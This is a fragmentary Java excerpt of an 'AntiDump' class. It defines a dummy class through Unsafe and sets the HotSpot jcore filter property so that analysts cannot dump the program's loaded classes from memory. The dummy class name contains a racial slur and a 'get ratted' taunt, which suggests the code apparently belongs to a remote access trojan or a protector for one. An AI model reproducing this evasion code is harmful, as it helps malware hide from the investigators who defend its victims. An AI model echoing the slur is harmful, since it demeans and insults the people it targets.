...
public class AntiDump {
    ...
    public static void check() {
        try {
            ...
            byte[] bytes = createDummyClass("lol.get.ratted.nigger");
            unsafe.defineClass("lol.get.ratted.nigger", bytes, 0, bytes.length, null, null);
            System.setProperty("sun.jvm.hotspot.tools.jcore.filter", "lol.get.ratted.nigger");
